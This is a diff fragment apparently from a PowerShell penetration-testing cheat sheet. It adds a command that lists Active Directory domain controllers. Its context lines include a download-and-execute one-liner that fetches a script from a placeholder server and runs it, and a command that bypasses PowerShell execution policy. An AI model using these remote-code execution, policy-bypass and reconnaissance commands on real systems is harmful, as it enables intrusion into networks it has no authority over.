@@ -192,7 +192,9 @@ IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')
 ## Powershell bypass execution policy
 
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+##Powershell identify Domain Controler
 
+[System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain().DomainControllers.Name
 
 ## Powershell identify server 2003 in the current domain 
 
